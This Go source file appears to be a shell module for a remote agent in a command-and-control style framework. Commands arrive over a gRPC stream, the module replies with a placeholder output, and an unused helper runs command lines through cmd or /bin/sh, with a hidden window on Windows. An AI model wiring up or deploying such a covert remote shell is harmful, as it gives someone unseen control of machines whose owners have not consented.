package shell

import (
	"context"
	"io"
	"log"
	"os/exec"
	"runtime"
	"syscall"
	pb "viper/protos/cmds"
)

func StartModule(client pb.AgentClient) {
	stream, err := client.RunShellCommand(context.Background())
	if err != nil {
		log.Fatalf("Failed to open stream: %v", err)
	}
	waitc := make(chan struct{})
	go func() {
		for {
			in, err := stream.Recv()
			if err == io.EOF {
				close(waitc)
				return
			}
			if err != nil {
				log.Fatalf("Failed to receive a shell command: %v", err)
			}
			log.Printf("Received shell command: '%s'", in.Cmd)
		}
	}()
	err = stream.Send(&pb.ShellCommandResponse{Output: "Hello World"})
	if err != nil {
		log.Fatalf("Failed to send shell command output: %v", err)
	}
	stream.CloseSend()
	<-waitc
}

func runShellCommand(cmdline string) []byte {
	var cmd *exec.Cmd
	log.Printf("Running shell command: '%s'", cmdline)
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdline)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdline)
	}
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("Failed to run shell command: %v", err)
	}
	return out
}
